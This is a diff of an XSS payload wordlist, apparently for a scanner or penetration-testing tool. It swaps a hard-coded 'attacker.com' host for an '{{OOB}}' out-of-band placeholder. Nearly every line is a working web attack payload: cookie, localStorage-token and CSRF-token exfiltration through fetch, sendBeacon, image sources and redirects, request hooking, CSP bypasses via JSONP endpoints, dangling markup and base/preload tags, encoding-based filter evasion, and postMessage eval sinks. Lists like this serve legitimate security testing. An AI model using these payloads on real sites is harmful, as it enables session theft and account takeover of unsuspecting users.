@@ -11,7 +11,7 @@
 <ScRiPt>alert(1)</ScRiPt>
 <script >alert(1)</script>
 <script	>alert(1)</script>
-<script/XSS src=//attacker.com/xss.js>
+<script/XSS src=//{{OOB}}/xss.js>
 </script><script>alert(1)</script>
 <script>eval(atob('YWxlcnQoMSk='))</script>
 <script>setTimeout('alert(1)',0)</script>
@@ -110,12 +110,12 @@ data:text/javascript,alert(1)
 <script nonce=INJECT>alert(1)</script>
 <meta http-equiv="Content-Security-Policy" content="">
 <object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
-<script>fetch('//attacker.com/?c='+document.cookie)</script>
-<script>location='//attacker.com/?c='+document.cookie</script>
-<script>document.write('<img src=//attacker.com/?c='+encodeURIComponent(document.cookie)+'>')</script>
+<script>fetch('//{{OOB}}/?c='+document.cookie)</script>
+<script>location='//{{OOB}}/?c='+document.cookie</script>
+<script>document.write('<img src=//{{OOB}}/?c='+encodeURIComponent(document.cookie)+'>')</script>
 <iframe srcdoc="<script>parent.alert(1)</script>">
-<base target="_blank"><a href=//attacker.com>click</a>
-<script src="//attacker.com/xss.js"></script>
+<base target="_blank"><a href=//{{OOB}}>click</a>
+<script src="//{{OOB}}/xss.js"></script>
 
 # ── CSP BYPASS: JSONP ENDPOINTS ──
 <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>
@@ -124,19 +124,19 @@ data:text/javascript,alert(1)
 <script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>
 
 # ── CSP BYPASS: DANGLING MARKUP ──
-"><img src='//attacker.com/?
-"><img src="//attacker.com/?
-"><table background="//attacker.com/?
-"><base href=//attacker.com/>
+"><img src='//{{OOB}}/?
+"><img src="//{{OOB}}/?
+"><table background="//{{OOB}}/?
+"><base href=//{{OOB}}/>
 
 # ── CSP BYPASS: IMPORT / PRELOAD ──
-<base href=//attacker.com>
-<link rel=prefetch href=//attacker.com/leak?c=>
-<link rel=preload href=//attacker.com as=script>
-<link rel=dns-prefetch href=//attacker.com>
+<base href=//{{OOB}}>
+<link rel=prefetch href=//{{OOB}}/leak?c=>
+<link rel=preload href=//{{OOB}} as=script>
+<link rel=dns-prefetch href=//{{OOB}}>
 <script src=data:,alert(1)></script>
 <script>import('data:text/javascript,alert(1)')</script>
-<iframe srcdoc="<script src=//attacker.com/xss.js></script>">
+<iframe srcdoc="<script src=//{{OOB}}/xss.js></script>">
 <meta http-equiv=Content-Security-Policy content="default-src *">
 
 # ── CSP BYPASS: TRUSTED TYPES (TT bypass) ──
@@ -152,7 +152,7 @@ data:text/javascript,alert(1)
 <script\x0d>alert(1)</script>
 <script\x0a>alert(1)</script>
 <<script>alert(1)//<</script>
-<SCRIPT/XSS SRC="http://attacker.com/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="http://{{OOB}}/xss.js"></SCRIPT>
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>
 <svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
 <img src=x onerror=String.fromCharCode(97,108,101,114,116,40,49,41)>
@@ -361,13 +361,13 @@ v-html="'<img src=x onerror=alert(1)>'"
 #{7*7}
 
 # ── EXFILTRATION ──
-<script>new Image().src='http://attacker.com/x?c='+document.cookie</script>
-<script>fetch('http://attacker.com/?c='+btoa(document.cookie))</script>
-<script>navigator.sendBeacon('http://attacker.com/',document.cookie)</script>
-<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">
-<script>document.location='http://attacker.com/?c='+document.cookie</script>
-<script>XMLHttpRequest.prototype.open=function(m,u){if(u.indexOf('attacker')==-1){fetch('http://attacker.com/?u='+u)}}</script>
-<script>document.querySelector('input[name=csrf]').value&&fetch('//attacker.com/?t='+document.querySelector('input[name=csrf]').value)</script>
+<script>new Image().src='http://{{OOB}}/x?c='+document.cookie</script>
+<script>fetch('http://{{OOB}}/?c='+btoa(document.cookie))</script>
+<script>navigator.sendBeacon('http://{{OOB}}/',document.cookie)</script>
+<img src=x onerror="this.src='http://{{OOB}}/?c='+document.cookie">
+<script>document.location='http://{{OOB}}/?c='+document.cookie</script>
+<script>XMLHttpRequest.prototype.open=function(m,u){if(u.indexOf('attacker')==-1){fetch('http://{{OOB}}/?u='+u)}}</script>
+<script>document.querySelector('input[name=csrf]').value&&fetch('//{{OOB}}/?t='+document.querySelector('input[name=csrf]').value)</script>
 
 # ── POSTMESSAGE XSS ──
 <script>window.addEventListener('message',function(e){eval(e.data)})</script>
@@ -515,13 +515,13 @@ v-html="'<img src=x onerror=alert(1)>'"
 <svg></p><style><a id="</style><img src=x onerror=alert(1)>">
 # srcdoc / import map / base / meta (2024 sink'ler)
 <iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;">
-<base href=//attacker.com/>
+<base href=//{{OOB}}/>
 <script type=importmap>{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type=module>import "x"</script>
 # data exfil PoC (çerez/oturum)
-"><script>fetch('//attacker.com/?c='+document.cookie)</script>
-"><script>navigator.sendBeacon('//attacker.com',document.cookie)</script>
-<img src=x onerror="this.src='//attacker.com/?'+document.cookie">
-<img src=x onerror="new Image().src='//attacker.com/?'+localStorage.getItem('token')">
+"><script>fetch('//{{OOB}}/?c='+document.cookie)</script>
+"><script>navigator.sendBeacon('//{{OOB}}',document.cookie)</script>
+<img src=x onerror="this.src='//{{OOB}}/?'+document.cookie">
+<img src=x onerror="new Image().src='//{{OOB}}/?'+localStorage.getItem('token')">
 # encoding / case / template-literal varyantları
 '-alert(document.domain)-'
 <sCrIpT>alert(1)</sCrIpT>
